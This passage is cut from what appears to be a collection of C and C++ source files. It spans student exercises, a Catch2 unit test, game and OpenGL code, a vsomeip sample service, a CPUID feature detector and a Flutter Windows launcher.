  //cout<<\"Address of Rahul \"<< &Rahul << endl;\r\n   Rahul.print();\r\n\r\n    //dynamically\r\n    Hero *h = new Hero(20);\r\n    h->print();\r\n\r\n    Hero temp(22,'B');\r\n    temp.print(); */\r\n    \r\n    /*  \r\n    //static allocation\r\n    Hero h1;\r\n    h1.setHealth(100);\r\n    h1.setLevel('A');\r\n    cout<<\"level is: \"<<h1.level << endl;\r\n    cout<<\"Health is: \"<<h1.getHealth() << endl;\r\n\r\n    //dynamically\r\n    Hero *h2 = new Hero;\r\n    h2->setHealth(80);\r\n    h2->setLevel('B'); \r\n    cout<<\"level is: \"<<(*h2).level << endl;\r\n    cout<<\"Health is: \"<<(*h2).getHealth() << endl;\r\n\r\n    cout<<\"level is: \"<<h2->level << endl;\r\n    cout<<\"Health is: \"<<h2->getHealth() << endl;\r\n    \r\n */\r\n\r\n  /*   //creation of object\r\n    Hero h1; \r\n    cout<<\"size of h1 is \"<<sizeof(h1)<<endl;\r\n\r\n    cout<< \"h1 health is \"<<h1.getHealth()<<endl;\r\n    //use setter\r\n    h1.setHealth(70);\r\n    h1.level = 'A';\r\n\r\n    cout<<\"Health is: \"<<h1.getHealth() << endl;\r\n    cout<<\"level is: \"<<h1.level << endl;\r\n\r\n    //cout<< \"Size : \"<< sizeof(h1) <<endl;\r\n     */\r\n    \r\n\r\n    return 0;\r\n}",
    "#include \"catch2/matchers/catch_matchers.hpp\"\n#include \"system.hpp\"\n#include <catch2/catch_test_macros.hpp>\n#include <catch2/matchers/catch_matchers_floating_point.hpp>\n#include <catch2/matchers/catch_matchers_range_equals.hpp>\n#include <cstddef>\n#include <vector>\n\nTEST_CASE(\"Test the system\", \"[System]\") {\n  // Create a system with two atoms\n  auto system = James::Atoms::System();\n  system.box = std::vector<double>{49.35, 49.35, 49.35};\n  system.boxLo =\n      std::vector<double>{-12.457628299, -12.457628299, -12.457628299};\n  auto positions = std::vector<std::vector<double>>{\n      {26.6679, 23.3139, 22.8734}, {25.1689, 20.8364, 22.0004}};\n\n  system.push_back(James::Atoms::Atom(1, 1, 1, positions[0]));\n  system.push_back(James::Atoms::Atom(4, 4, 2, positions[1]));\n\n  // Test that the distance between the O and Cl is 3.02442\n  double dist_required = 3.02442;\n\n  REQUIRE_THAT(system.distance(0, 1),\n               Catch::Matchers::WithinRel(dist_required, 1e-5));\n\n  // Add two H atoms\n  auto h1_atom_pos = std::vector<double>{26.0598, 22.5748, 22.8577};\n  auto h2_atom_pos = std::vector<double>{26.7405, 23.5454, 23.7993};\n  system.push_back(James::Atoms::Atom(2, 2, 1, h1_atom_pos));\n  system.push_back(James::Atoms::Atom(3, 2, 1, h2_atom_pos));\n\n  // Find all indices in atoms such that the mol_id=1\n  int mol_id = system.atoms[0].mol_id.value();\n  auto indices_required = std::vector<size_t>{0, 2, 3};\n  auto atom_indices = system.find_atoms_in_molecule(mol_id);\n\n  REQUIRE_THAT(atom_indices, Catch::Matchers::RangeEquals(indices_required));\n\n  // Should return an empty vector if there are no matches\n  auto empty_indices = system.find_atoms_in_molecule(4);\n  REQUIRE(empty_indices.size() == 0);\n}",
    "#include<stdio.h>\r\n\r\nint main ()\r\n{\r\n\t// creat variable \r\n\t\r\n\tint sawanType ,NumberOfSawan  ;\r\n\tchar oderType , nextOder;\r\n\t\r\n\tfloat total ;\r\n\t\r\n\t//get User Input\r\n\t\r\n\tdo {\r\n\t\t\r\n\t\t\tprintf(\"Please Enter Sawan Type : \") ;\r\n\t\t\tscanf(\"%d\",&sawanType) ;\r\n\t\t\t\r\n\t\t\tprintf(\"Please Enter Number Of Sawan :\");\r\n\t\t\tscanf(\"%d\",&NumberOfSawan) ;\r\n\t\t\t\r\n\t\t\tprintf(\"Please Enter oder Type \");\r\n\t\t\tscanf(\" %c\",&oderType); \r\n\t\t\t\r\n\t\t\t\r\n\t\t\r\n\t\t\t\r\n\t\t\tif (sawanType == 1 )\r\n\t\t\t{\r\n\t\t\t\ttotal = NumberOfSawan * 10000.00 ;\r\n\t\t\t\r\n\t\t\t\t\r\n\t\t\t\t\r\n\t\t\t}else if (sawanType == 2)\r\n\t\t\t{\r\n\t\t\t\ttotal = NumberOfSawan * 12000.00 ;\r\n\t\t\t\t\r\n\t\t\t}else if (sawanType == 3)\r\n\t\t\t{\r\n\t\t\t\ttotal = NumberOfSawan * 15000.00 ;\r\n\t\t\t}\r\n\t\t\telse {\r\n\t\t\t\t\r\n\t\t\t\tprintf(\"please Enter Valid Sawan Type \\n\") ;\r\n\t\t\t}\r\n\t\t\t\r\n\t\t\t\r\n\t\t\tif (oderType == 'I')\r\n\t\t\t{\r\n\t\t\t\ttotal =  (total *15 /100) + total ;\r\n\t\t\t\t\r\n\t\t\t}else if(oderType = 'T')\r\n\t\t\t{\r\n\t\t\t\ttotal =  (total *5 /100) + total ;\r\n\t\t\t\t\r\n\t\t\t}else if (oderType == 'D')\r\n\t\t\t{\r\n\t\t\t\t\r\n\t\t\t\ttotal =  (total *5 /100) + total ;\r\n\t\t\t}\r\n\t\t\t\r\n\t\t\tprintf(\"\\nThe Ammount to be Paid : %.2f\", total) ;\r\n\t\t\t\r\n\t\t\t\r\n\t\t\t\r\n\t\t\t\r\n\t\t\t\r\n\t\t\t\r\n\t\t\t\r\n\t\t\t\r\n\t\t\t\r\n\t\t\t\r\n\t\r\n\t\t\tprintf(\"\\nDo you want to Input the Next Oder Deatail : \") ;\r\n\t\t\tscanf(\" %c\",&nextOder) ;\r\n\t\t\t\r\n\t\t\t//printf(\"%d\",NumberOfSawan) ;\r\n\t\t\t\r\n\t\t\tprintf(\"\\n\");\r\n\t\t\tprintf(\"\\n\");\r\n\t\t\r\n\t\t\t\r\n\t\r\n\t} while (nextOder != 'N') ;\r\n\t\r\n\t\r\n\t\r\n\t\r\n\t\r\n\t\r\n\t\r\n\t\r\n\t\r\n\treturn 0 ;\r\n}\r\n",
    "#include \"../headers/bullet.h\"\n\n// Constructor creates a new bullet at the player position and sets up the target at where the mouse is\nBullet::Bullet(Vector2 newTarget, Vector2 newOrigin, float speed, Texture2D texture)\n{\n    // Set up bullet dimensions and origin\n    bulletRect.height = bulletRect.width = 10;\n    bulletRect.x = newOrigin.x - bulletRect.width/2;\n    bulletRect.y = newOrigin.y - bulletRect.height/2;\n\n    // Calculate the distance that needs to be travelled on the x and y axes as well as the total distance needed\n    deltaX = newTarget.x - bulletRect.x;\n    deltaY = newTarget.y - bulletRect.y;\n    delta = sqrt(pow(deltaX, 2) + pow(deltaY, 2));\n    // Obviously starting out it's not going to be deleted and will not have travelled at all\n    isDeleted = false;\n    distanceTravelled = 0;\n\n    // Store texture and speed\n    bulletTexture = texture;\n\n    speedScale = speed;\n}\n\n// Moves the bullet every frame and determines when it should be destroyed\nvoid Bullet::ShootTick() // This took way longer than I would care to admit\n{\n    // If the bullet has gone the total distance required, it deletes itself\n    if(distanceTravelled >= delta)\n    {\n        isDeleted = true;\n        distanceTravelled = 0;\n    } else { \n        // I'm not sure how this math works but it does so I'm not touching it\n        bulletRect.x += deltaX/delta * speedScale * GetFrameTime() * 70;\n        bulletRect.y += deltaY/delta * speedScale * GetFrameTime() * 70;\n        // Distance travelled is calculated using Pythagorean Theorem\n        distanceTravelled += sqrt(pow(deltaX/delta * speedScale * GetFrameTime() * 70, 2) + pow(deltaY/delta * speedScale * GetFrameTime() * 70, 2));\n        Draw();\n    }\n}\n\nvoid Bullet::Draw()\n{\n    // Draw Bullet\n    DrawTextureEx(bulletTexture, (Vector2){bulletRect.x, bulletRect.y}, 0, 2, WHITE);\n}\n\n// Return the rectangle of the bullet (for collisions and stuff)\nRectangle Bullet::GetRect()\n{\n    return bulletRect;\n}",
    "#include <iomanip>\n#include <iostream>\n#include <sstream>\n\n#include <vsomeip/vsomeip.hpp>\n\n#define SAMPLE_SERVICE_ID 0x1234\n#define SAMPLE_INSTANCE_ID 0x5678\n#define SAMPLE_METHOD_ID 0x0421\n\nstd::shared_ptr<vsomeip::application> app;\n\nvoid on_message(const std::shared_ptr<vsomeip::message> &_request) {\n\n    std::shared_ptr<vsomeip::payload> its_payload = _request->get_payload();\n    vsomeip::length_t l = its_payload->get_length();\n\n    // Get payload\n    std::stringstream ss;\n    for (vsomeip::length_t i=0; i<l; i++) {\n       ss << std::setw(2) << std::setfill('0') << std::hex\n          << (int)*(its_payload->get_data()+i) << \" \";\n    }\n\n    std::cout << \"SERVICE: Received message with Client/Session [\"\n        << std::setw(4) << std::setfill('0') << std::hex << _request->get_client() << \"/\"\n        << std::setw(4) << std::setfill('0') << std::hex << _request->get_session() << \"] \"\n        << ss.str() << std::endl;\n\n    // Create response\n    std::shared_ptr<vsomeip::message> its_response = vsomeip::runtime::get()->create_response(_request);\n    its_payload = vsomeip::runtime::get()->create_payload();\n    std::vector<vsomeip::byte_t> its_payload_data;\n    for (int i=9; i>=0; i--) {\n        its_payload_data.push_back(i % 256);\n    }\n    its_payload->set_data(its_payload_data);\n    its_response->set_payload(its_payload);\n    app->send(its_response);\n}\n\nint main() {\n\n   app = vsomeip::runtime::get()->create_application(\"World\");\n   app->init();\n   app->register_message_handler(SAMPLE_SERVICE_ID, SAMPLE_INSTANCE_ID, SAMPLE_METHOD_ID, on_message);\n   app->offer_service(SAMPLE_SERVICE_ID, SAMPLE_INSTANCE_ID);\n   app->start();\n}",
    "#include <iostream>\r\n#include <iomanip>  \r\n#include <string>\r\n#include <conio.h>  \r\n\r\nusing namespace std;\r\n\r\n// Menampilkan nama dan harga barang dalam bentuk tabel\r\nvoid displayAvailableItems(const string nama[], const int hrg[], int size) {\r\n    cout << \"\\t\\t\\t-----------------------------------------\\n\";\r\n    cout << \"\\t\\t\\t| No | Nama Barang     |  Harga         |\\n\";\r\n    cout << \"\\t\\t\\t-----------------------------------------\\n\";\r\n    for (int i = 0; i < size; i++) {\r\n        cout << \"\\t\\t\\t| \" << setw(2) << i << \" | \" << setw(14) << nama[i] << \" | Rp. \" << setw(10) << hrg[i] << \" |\\n\";\r\n    }\r\n    cout << \"\\t\\t\\t-----------------------------------------\\n\";\r\n}\r\n\r\n// Menu login\r\nbool login() {\r\n    string username, password;\r\n    const string correctUsername = \"ahmad\";\r\n    const string correctPassword = \"ridwan\";\r\n\r\n    cout << \"\\t\\t\\t===========================================\\n\";\r\n    cout << \"\\t\\t\\t|                LOGIN MENU               |\\n\";\r\n    cout << \"\\t\\t\\t===========================================\\n\";\r\n\r\n    cout << \"\\t\\t\\tUsername: \";\r\n    cin >> username;\r\n\r\n    cout << \"\\t\\t\\tPassword: \";\r\n    char ch;\r\n    ch = _getch(); // Get character without echo\r\n    while (ch != 13) { // Character 13 is enter\r\n        password.push_back(ch);\r\n        cout << '*';\r\n        ch = _getch();\r\n    }\r\n    cout << endl;\r\n\r\n    if (username == correctUsername && password == correctPassword) {\r\n        cout << \"\\t\\t\\tSelamat datang di toko kami!\" << endl;\r\n        return true;\r\n    } else {\r\n        cout << \"\\t\\t\\tLogin gagal. Coba ulangi lagi.\" << endl;\r\n        return false;\r\n    }\r\n}\r\n\r\nint main() {\r\n    const int SIZE = 5;\r\n    string availableItems[SIZE] = {\"Beras\", \"Gula\", \"Minyak Goreng\", \"Telur\", \"Susu\"};\r\n    int prices[SIZE] = {12000, 15000, 20000, 22000, 25000};\r\n\r\n    string nama[100];\r\n    int hrg[100], jmlh[100], ttlhrg[100];\r\n    int brng, pmbyr, kmbl, k2, tsh;\r\n    string p, buyerName;\r\n\r\n    // Jika login gagal, meminta ulang\r\n    while (!login()) {}\r\n\r\n    cout << \"\\t\\t\\t===========================================\\n\";\r\n    cout << \"\\t\\t\\t|               RRRRRRRRR                 |\\n\";\r\n    cout << \"\\t\\t\\t|               R       RR                |\\n\";\r\n    cout << \"\\t\\t\\t|               R      RR                 |\\n\";\r\n    cout << \"\\t\\t\\t|               R     RR                  |\\n\";\r\n    cout << \"\\t\\t\\t|               R    R                    |\\n\";\r\n    cout << \"\\t\\t\\t|               R       RR                |\\n\";\r\n    cout << \"\\t\\t\\t|               R         RR              |\\n\";\r\n    cout << \"\\t\\t\\t-------------------------------------------\\n\";\r\n    cout << \"\\t\\t\\t================= RIDWAN ================\\n\";\r\n    cout << \"\\t\\t\\t-------------------------------------------\\n\";\r\n    cout << \"\\t\\t\\t|           PROGRAM STRUK TOKO            |\\n\";\r\n    cout << \"\\t\\t\\t-------------------------------------------\\n\";\r\n\r\n    cout << \"\\t\\t\\t Masukkan nama pembeli: \";\r\n    cin.ignore();  // \r\n    getline(cin, buyerName);\r\n\r\n    do {\r\n        tsh = 0;\r\n        cout << \"\\t\\t\\t Masukkan banyak barang: \";\r\n        cin >> brng;\r\n        \r\n        displayAvailableItems(availableItems, prices, SIZE);\r\n\r\n        for (int i = 0; i < brng; i++) {\r\n            int idx;\r\n            cout << \"\\t\\t\\t Masukkan nomor barang ke-\" << i + 1 << \": \";\r\n            cin >> idx;\r\n            if (idx < 0 || idx >= SIZE) {\r\n                cout << \"\\t\\t\\t Nomor barang tidak valid. Ulangi.\\n\";\r\n                i--;\r\n                continue;\r\n            }\r\n            cout << \"\\t\\t\\t Masukkan jumlah barang\\t\\t: \";\r\n            cin >> jmlh[i];\r\n            nama[i] = availableItems[idx];  \r\n            hrg[i] = prices[idx];    \r\n            cout << endl;\r\n        }\r\n\r\n        for (int i = 0; i < brng; i++) {\r\n            ttlhrg[i] = jmlh[i] * hrg[i];\r\n            tsh += ttlhrg[i];\r\n        }\r\n        cout << \"\\t\\t\\t Total harga keseluruhan\\t: Rp. \" << tsh << endl;\r\n        cout << \"\\t\\t\\t Masukkan jumlah pembayaran\\t: Rp. \";\r\n        cin >> pmbyr;\r\n        kmbl = pmbyr - tsh;\r\n\r\n        cout << \"\\t\\t\\t=========================================\\n\";\r\n        cout << \"\\t\\t\\t Nama Pembeli: \" << buyerName << endl;\r\n        cout << \"\\t\\t\\t Daftar belanja anda:\\n\";\r\n        cout << \"\\t\\t\\t-----------------------------------------\\n\";\r\n        cout << \"\\t\\t\\t| No | Nama Barang     | Jumlah |  Harga   |\\n\";\r\n        cout << \"\\t\\t\\t-----------------------------------------\\n\";\r\n        for (int i = 0; i < brng; i++) {\r\n            cout << \"\\t\\t\\t| \" << setw(2) << i + 1 << \" | \" << setw(14) << nama[i] << \" | \" << setw(6) << jmlh[i] << \" | Rp. \" << setw(6) << hrg[i] << \" |\\n\";\r\n        }\r\n        cout << \"\\t\\t\\t-----------------------------------------\\n\";\r\n\r\n        if (pmbyr >= tsh) {\r\n            cout << \"\\t\\t\\t\\tTotal harga\\t\\t: Rp. \" << tsh << endl;\r\n            cout << \"\\t\\t\\t\\tPembayaran\\t\\t: Rp. \" << pmbyr << endl;\r\n            cout << \"\\t\\t\\t\\tKembalian\\t\\t: Rp. \" << kmbl << endl;\r\n            cout << \"\\t\\t\\t|=========",
    "#include <napi.h>\n#include <algorithm>\n#include <iostream>\n#include <string>\n\n#ifdef _WIN32\n#include <limits.h>\n#include <intrin.h>\ntypedef unsigned __int32 uint32_t;\n#else\n#include <stdint.h>\n#endif\n\nusing namespace std;\n\n#if defined(_WIN32) || defined(LINUX)\n#define MAX_INTEL_TOP_LVL 4\n\nclass CPUID\n{\n    uint32_t regs[4];\n\npublic:\n    explicit CPUID(unsigned funcId, unsigned subFuncId)\n    {\n#ifdef _WIN32\n        __cpuidex((int *)regs, (int)funcId, (int)subFuncId);\n\n#else\n        asm volatile(\"cpuid\" : \"=a\"(regs[0]), \"=b\"(regs[1]), \"=c\"(regs[2]), \"=d\"(regs[3])\n                     : \"a\"(funcId), \"c\"(subFuncId));\n        // ECX is set to zero for CPUID function 4\n#endif\n    }\n\n    const uint32_t &EAX() const { return regs[0]; }\n    const uint32_t &EBX() const { return regs[1]; }\n    const uint32_t &ECX() const { return regs[2]; }\n    const uint32_t &EDX() const { return regs[3]; }\n};\n\nclass CPUInfo\n{\npublic:\n    CPUInfo();\n    string vendor() const { return mVendorId; }\n    string model() const { return mModelName; }\n    int cores() const { return mNumCores; }\n    float cpuSpeedInMHz() const { return mCPUMHz; }\n    bool isSSE() const { return mIsSSE; }\n    bool isSSE2() const { return mIsSSE2; }\n    bool isSSE3() const { return mIsSSE3; }\n    bool isSSE41() const { return mIsSSE41; }\n    bool isSSE42() const { return mIsSSE42; }\n    bool isAVX() const { return mIsAVX; }\n    bool isAVX2() const { return mIsAVX2; }\n    bool isAVX512() const { return mIsAVX512; }\n    bool isHyperThreaded() const { return mIsHTT; }\n    int logicalCpus() const { return mNumLogCpus; }\n\nprivate:\n    // Bit positions for data extractions\n    static const uint32_t SSE_POS = 0x02000000;\n    static const uint32_t SSE2_POS = 0x04000000;\n    static const uint32_t SSE3_POS = 0x00000001;\n    static const uint32_t SSE41_POS = 0x00080000;\n    static const uint32_t SSE42_POS = 0x00100000;\n    static const uint32_t AVX_POS = 0x10000000;\n    static const uint32_t AVX2_POS = 0x00000020;\n    static const uint32_t AVX512_POS = 0x00010000; // AVX-512F bit in EBX from CPUID function 7\n    static const uint32_t LVL_NUM = 0x000000FF;\n    static const uint32_t LVL_TYPE = 0x0000FF00;\n    static const uint32_t LVL_CORES = 0x0000FFFF;\n\n    // Attributes\n    string mVendorId;\n    string mModelName;\n    int mNumSMT;\n    int mNumCores;\n    int mNumLogCpus;\n    float mCPUMHz;\n    bool mIsHTT;\n    bool mIsSSE;\n    bool mIsSSE2;\n    bool mIsSSE3;\n    bool mIsSSE41;\n    bool mIsSSE42;\n    bool mIsAVX;\n    bool mIsAVX2;\n    bool mIsAVX512;\n};\n\nCPUInfo::CPUInfo()\n{\n    // Get vendor name EAX=0\n    CPUID cpuID0(0, 0);\n    uint32_t HFS = cpuID0.EAX();\n    mVendorId += string((const char *)&cpuID0.EBX(), 4);\n    mVendorId += string((const char *)&cpuID0.EDX(), 4);\n    mVendorId += string((const char *)&cpuID0.ECX(), 4);\n    // Get SSE instructions availability\n    CPUID cpuID1(1, 0);\n    mIsHTT = cpuID1.EDX() & AVX_POS;\n    mIsSSE = cpuID1.EDX() & SSE_POS;\n    mIsSSE2 = cpuID1.EDX() & SSE2_POS;\n    mIsSSE3 = cpuID1.ECX() & SSE3_POS;\n    mIsSSE41 = cpuID1.ECX() & SSE41_POS;\n    mIsSSE42 = cpuID1.ECX() & SSE41_POS;\n    mIsAVX = cpuID1.ECX() & AVX_POS;\n    // Get AVX2 and AVX512 instructions availability\n    CPUID cpuID7(7, 0);\n    mIsAVX2 = cpuID7.EBX() & AVX2_POS;\n    mIsAVX512 = cpuID7.EBX() & AVX512_POS;\n\n    string upVId = mVendorId;\n    for_each(upVId.begin(), upVId.end(), [](char &in)\n             { in = ::toupper(in); });\n    // Get num of cores\n    if (upVId.find(\"INTEL\") != std::string::npos)\n    {\n        if (HFS >= 11)\n        {\n            for (int lvl = 0; lvl < MAX_INTEL_TOP_LVL; ++lvl)\n            {\n                CPUID cpuID4(0x0B, lvl);\n                uint32_t currLevel = (LVL_TYPE & cpuID4.ECX()) >> 8;\n                switch (currLevel)\n                {\n                case 0x01:\n                    mNumSMT = LVL_CORES & cpuID4.EBX();\n                    break;\n                case 0x02:\n                    mNumLogCpus = LVL_CORES & cpuID4.EBX();\n                    break;\n                default:\n                    break;\n                }\n            }\n            mNumCores = mNumLogCpus / mNumSMT;\n        }\n        else\n        {\n            if (HFS >= 1)\n            {\n                mNumLogCpus = (cpuID1.EBX() >> 16) & 0xFF;\n                if (HFS >= 4)\n                {\n                    mNumCores = 1 + (CPUID(4, 0).EAX() >> 26) & 0x3F;\n                }\n            }\n            if (mIsHTT)\n            {\n                if (!(mNumCores > 1))\n                {\n                    mNumCores = 1;\n                    mNumLogCpus = (mNumLogCpus >= 2 ? mNumLogCpus : 2);\n                }\n            }\n            else\n            {\n                mNumCores = mNumLogCpus = 1;\n            }\n        }\n    }\n    else if (upVId.find(\"AMD\") != std::string::npos)\n    {\n        if (HFS >= 1)\n        {\n            mNumLogCpus = (cpuID1.EBX() >> 16) & 0xFF;\n            if (CPUID(0x80000000, 0).EAX() >= 8)\n            {\n                mNumCores = 1 +",
    "/*!\n@file\n\nOpdracht 1 DSB practicum. Werk deze opdracht verder uit aan de hand van het kommentaar.\nAssignment 1 DSB practical. Elaborate this assignment on the basis of the comments.\n\n@version $Rev: 317 $\n@author $Author: ewout $\n@note  Werk deze code verder uit volgens de opdracht  / Complete this code according to the assignment.\n@copyright Copyright 2006-2022 ir drs E.J Boks Hogeschool van Arnhem en Nijmegen.\n$Id: dsbComplexBasis.cpp 317 2023-03-08 14:16:10Z ewout $\n*/\n\n#include <cmath>\n#include <cassert>\n\n#include <dsbComplex.h>\n\n#ifdef BouwDesktopApp\n\n#include <dsbComplexBasis.h>\n#include <wx/numformatter.h>\n\n\nPolairPrinter::PolairPrinter(const PolairGetal &pg) : p(pg)\n{\n\n};\n\nwxString PolairPrinter::str(const PolairGetal &pg,const PolairPrinter::Formaat formaat, const Teller precisie)\n{\n\tconst wxString grString(wxNumberFormatter::ToString(pg.Mag(),precisie));\n\tconst wxString fString(wxNumberFormatter::ToString(pg.Arg(),precisie));\n\t\n\tconst wxString uit((Formaat::Standaard==formaat) ?\n\t                   wxString::Format(wxT(\"|%s|*/_%s\"), grString,fString) :\n\t                   wxString::Format(wxT(\"%s:%s\"), grString,fString));\n\treturn(uit);\n}\n\nwxString PolairPrinter::str(const Teller precisie) const\n{\n\tconst wxString uit(str(p,Formaat::Standaard,precisie));\n\treturn(uit);\n};\n\nwxString PolairPrinter::wiskstr(const Teller precisie) const\n{\n\tconst wxString uit(str(p,Formaat::Importeerbaar,precisie));\n\treturn(uit);\n}\n\nComplexPrinter::ComplexPrinter(Complex &c) : z(c)\n{\n\n}\n\n\nwxString ComplexPrinter::str(const Complex &cw,const ComplexPrinter::Formaat formaat)\n{\n\tconst wxString xs(wxNumberFormatter::ToString(cw.Re(),3));\n\tconst wxString ys(wxNumberFormatter::ToString(cw.Im(),3));\n\t\n\tconst wxString uit((Formaat::Standaard==formaat) ?\n\t                   wxString::Format(wxT(\"[Re:%s Im:%s]\"), xs,ys) :\n\t                   wxString::Format(wxT(\"%s+%sj\"), xs,ys));\n\treturn(uit);\n}\n\nwxString ComplexPrinter::str() const\n{\n\tconst wxString uit(str(z,Formaat::Standaard));\n\treturn(uit);\n};\n\nwxString ComplexPrinter::wiskstr() const\n{\n\tconst wxString uit(str(z,Formaat::Importeerbaar));\n\treturn(uit);\n}\n\nRetCode ComplexPrinter::importeer(const wxString& invoer)\n{\n\tauto retkode = RetCode::Onbekend;\n\t\n\t/* controleer of de string een imaginair stuk bevat */\n\tif (false == invoer.Contains(wxT(\"j\")))\n\t{\n\t\t/* Kijk of het een polair getail is */\n\t\tif (false == invoer.Contains(wxT(\":\")))\n\t\t{\n\t\t\t/* Het is een volledig reel getal. */\n\t\t\tdouble waarde;\n\t\t\tconst bool gelukt = wxNumberFormatter::FromString(invoer,&waarde);\n\t\t\t\n\t\t\tif (true == gelukt)\n\t\t\t{\n\t\t\t\tz.x = static_cast<float>(waarde);\n\t\t\t\tz.y = 0.0f;\n\t\t\t}\n\t\t\tretkode = (true == gelukt) ? RetCode::Ok : RetCode::Fout;\n\t\t}\n\t\telse\n\t\t{\n\t\t\t/* Het is een polair getal. */\n\t\t\tconst wxString voorkomma(invoer.Before(':'));\n\t\t\tdouble rwaarde;\n\t\t\tconst bool rgelukt = wxNumberFormatter::FromString(voorkomma,&rwaarde);\n\t\t\tif (false == rgelukt)\n\t\t\t\tretkode = RetCode::Fout;\n\t\t\telse\n\t\t\t{\n\t\t\t\t/* Doe phi */\n\t\t\t\twxString nakomma(invoer.After(':'));\n\t\t\t\t\n\t\t\t\t/* kijk of het een hoek is :\n\t\t\t\tp ==> hoek is aangegeven in pi.\n\t\t\t\td ==> hoek is aangegev en ion graden.\n\t\t\t\tk ==> hoek is aangegeven als 2*pi/k deel*/\n\t\t\t\tconst bool pihoek = nakomma.StartsWith(wxT(\"p\"));\n\t\t\t\tconst bool gradhoek = nakomma.StartsWith(wxT(\"d\"));\n\t\t\t\t\n\t\t\t\t/* mag niet tergelijkertijd, dan is er iets fout gegaan. */\n\t\t\t\twxASSERT(false == ((true == pihoek) && (true == gradhoek)));\n\t\t\t\t\n\t\t\t\tif (true == pihoek)\n\t\t\t\t\tnakomma = nakomma.After('p');\n\t\t\t\telse if (true == gradhoek)\n\t\t\t\t\tnakomma = nakomma.After('d');\n\t\t\t\t\n\t\t\t\tdouble phiwaarde;\n\t\t\t\t\n\t\t\t\tconst bool phigelukt = wxNumberFormatter::FromString(nakomma,&phiwaarde);\n\t\t\t\t\n\t\t\t\tif (true == phigelukt)\n\t\t\t\t{\n\t\t\t\t\t/* voer het getal in */\n\t\t\t\t\tif (true == pihoek)\n\t\t\t\t\t\tphiwaarde *= PI;\n\t\t\t\t\telse if (true == gradhoek)\n\t\t\t\t\t\tphiwaarde *= PI / 180.0f;\n\t\t\t\t\t\n\t\t\t\t\tconst PolairGetal pg(static_cast<float>(rwaarde), static_cast<float>(phiwaarde));\n\t\t\t\t\tz = (pg);\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tretkode = ((true == phigelukt) ? RetCode::Ok : RetCode::Fout);\n\t\t\t}\n\t\t}\n\t}\n\telse\n\t{\n\t\t/* vind de reele en imaginaire komponenten. */\n\t\twxString subinvoer(invoer.SubString(1, invoer.Length()));\n\t\t\n\t\tconst bool posj = (true == subinvoer.Contains(wxT(\"+\")));\n\t\tconst bool negj = (true == subinvoer.Contains(wxT(\"-\")));\n\t\t\n\t\twxASSERT(posj != negj);\n\t\t\n\t\tif (true == posj)\n\t\t{\n\t\t\tconst wxString voorj(invoer.Before('+'));\n\t\t\tdouble xwaarde;\n\t\t\tconst bool xgelukt = wxNumberFormatter::FromString(voorj,&xwaarde);\n\t\t\tif (true == xgelukt)\n\t\t\t\tz.x = static_cast<float>(xwaarde);\n\t\t\t\n\t\t\tconst wxString naplus(subinvoer.After('+'));\n\t\t\tconst wxString imwaarde(naplus.Before('j'));\n\t\t\tdouble ywaarde;\n\t\t\tconst bool ygelukt = wxNumberFormatter::FromString(imwaarde,&ywaarde);\n\t\t\tif (true == ygelukt)\n\t\t\t\tz.y = static_cast<float>(ywaarde);\n\t\t\t\n\t\t\tretkode = ((true == xgelukt) && (true == ygelukt)) ? RetCode::Ok : RetCode::Fout;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tconst wxString voorj(invoer.Before('-'));\n\t\t\tdouble xwaarde;\n\t\t\tconst bool xgelukt = wxNumberFormatter::FromStr",
    "#include \"opengl/vertexArray.hpp\"\n\n#include <third_party/glad/glad.h>\n\nVertexArray::VertexArray(const float* vertices, unsigned int numVertices,\n\t\t\t\t\t\t const unsigned int* indices, unsigned int numIndices)\n\t: mVertices(numVertices), mIndices(numIndices) {\n\tglGenBuffers(1, &mVBO);\n\tglGenBuffers(1, &mEBO);\n\n\t// Save the conf to VAO\n\tglGenVertexArrays(1, &mVAO);\n\tglBindVertexArray(mVAO);\n\n\tglBindBuffer(GL_ARRAY_BUFFER, mVBO);\n\tglBufferData(GL_ARRAY_BUFFER, numVertices * sizeof(vertices[0]), vertices, GL_STATIC_DRAW);\n\n\tglBindBuffer(GL_ELEMENT_ARRAY_BUFFER, mEBO);\n\tglBufferData(GL_ELEMENT_ARRAY_BUFFER, numIndices * sizeof(indices[0]), indices, GL_STATIC_DRAW);\n\n\tglVertexAttribPointer(0, 3, GL_FLOAT, GL_FALSE, 8 * sizeof(vertices[0]), static_cast<GLvoid*>(0));\n\tglEnableVertexAttribArray(0);\n\tglVertexAttribPointer(1, 3, GL_FLOAT, GL_FALSE, 8 * sizeof(vertices[0]), reinterpret_cast<GLvoid*>(3 * sizeof(vertices[0])));\n\tglEnableVertexAttribArray(1);\n\tglVertexAttribPointer(2, 2, GL_FLOAT, GL_FALSE, 8 * sizeof(vertices[0]), reinterpret_cast<GLvoid*>(6 * sizeof(vertices[0])));\n\tglEnableVertexAttribArray(2);\n\n\tglBindVertexArray(0);\n}\n\nVertexArray::~VertexArray() {\n\tglDeleteVertexArrays(1, &mVAO);\n\tglDeleteBuffers(1, &mVBO);\n\tglDeleteBuffers(1, &mEBO);\n}\n\nvoid VertexArray::activate() const { glBindVertexArray(mVAO); }\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"passport_mrz_parser\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
